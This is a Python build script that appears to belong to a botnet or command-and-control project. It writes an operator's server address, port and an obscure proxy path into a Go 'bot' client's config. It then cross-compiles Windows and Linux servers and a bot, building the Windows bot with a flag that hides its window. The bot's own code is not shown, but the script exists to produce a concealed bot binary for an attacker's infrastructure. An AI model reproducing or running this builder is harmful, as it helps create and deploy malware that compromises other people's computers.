import json
import os
import time


def ReadConfig(path: str) -> str:
    try:
        with open(path) as jsonf:
            config = json.load(jsonf)
    except:
        print("I can't find the config file")
        exit(0)
    return config


def Build(config: str):

    with open("client/config/config.go") as botconf:
        conf = botconf.read()

    result = ""
    for i in conf.split("\n"):
        if i.startswith("	TARGET_SERVER = "):
            result = conf.replace(
                i, f'	TARGET_SERVER = "{config["Bot"]["Server"]}"')
        if i.startswith("	TARGET_PORT"):
            result = result.replace(
                i, f'	TARGET_PORT   = "{config["Bot"]["Port"]}" ')
        if i.startswith("	PROXYURL ="):
            if config["Api"]["CustomPathEnabled"] == True:
                result = result.replace(
                    i, f'	PROXYURL = "http://{config["Api"]["Server"]}:{config["Api"]["Port"]}{config["Api"]["CustomPath"]}')
            else:
                result = result.replace(
                    i, f'	PROXYURL = "http://{config["Api"]["Server"]}:{config["Api"]["Port"]}/DewmDCSjihfwj"')

    os.remove("./client/config/config.go")

    with open("./client/config/config.go", "w") as file:
        file.write(result)

    os.system("""
	rm -r -f bin
	mkdir bin
	mkdir bin/linux
	mkdir bin/windows
	

	GOOS=windows go build -ldflags "-s -w" -o win_server.exe .
	GOOS=linux go build -ldflags "-s -w" -o linux_server.bin .
	cp win_server.exe ./bin/windows
	cp linux_server.bin ./bin/linux

    cd client
	GOOS=linux go build -ldflags "-s -w" -o bot.bin .
	GOOS=windows go build -ldflags "-H windowsgui -s -w" -o bot.exe .

	cp bot.bin ../bin/linux
	cp bot.exe ../bin/windows

	rm bot.bin
	rm bot.exe

	rm ../linux_server.bin
	rm ../win_server.exe

    """)


if __name__ == "__main__":

    if os.name != "posix":
        print("I can't work on your OS")
        exit(0)

    config = ReadConfig("./config.json")  # U can change config dir

    print("Building...")
    Build(config)
    print("Success. Build dir: bin")
